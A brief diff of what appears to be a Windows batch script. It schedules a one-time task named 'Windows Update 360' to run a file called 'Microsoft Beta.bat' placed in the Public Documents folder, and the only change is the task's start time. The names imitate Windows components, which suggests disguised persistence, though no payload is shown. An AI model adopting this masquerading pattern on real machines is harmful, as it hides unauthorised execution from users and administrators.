@@ -4,5 +4,4 @@ powershell.exe New-Item -Path 'C:\Users\Public\Documents\Microsoft Beta.bat' -It
 
 SCHTASKS /Delete /TN "Windows Update 360" /f
 
-SCHTASKS /Create /TN "Windows Update 360" /ST 03:52:00 /SC ONCE /TR "C:\Users\Public\Documents\Microsoft Beta.bat"
-
+SCHTASKS /Create /TN "Windows Update 360" /ST 10:20:00 /SC ONCE /TR "C:\Users\Public\Documents\Microsoft Beta.bat"
